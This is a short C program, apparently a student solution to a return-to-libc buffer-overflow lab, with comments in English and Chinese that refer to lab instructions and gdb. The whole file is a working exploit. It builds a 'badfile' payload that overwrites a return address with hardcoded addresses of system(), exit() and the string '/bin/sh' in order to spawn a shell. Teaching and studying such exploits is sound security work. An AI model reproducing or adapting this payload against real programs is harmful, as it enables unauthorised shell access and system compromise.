/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  badfile = fopen("./badfile", "w");

 /* You need to decide the addresses and 
 the values for X, Y, Z. The order of the following 
 three statements do not imply the order of X, Y, Z.
  Actually, we intentionally scrambled the order. */
   /*参考后面的实验指导，以及上课课件，了解如何利用gdb获得相关地址信息，并进一步填充buffer*/
  strcpy(buf,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90");
  *(long *) &buf[32] = 0xb7f6382b;   //  "/bin/sh"
  *(long *) &buf[24] = 0xb7e42da0;   //  system()
  *(long *) &buf[28] = 0xb7e369d0;   //  exit()

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
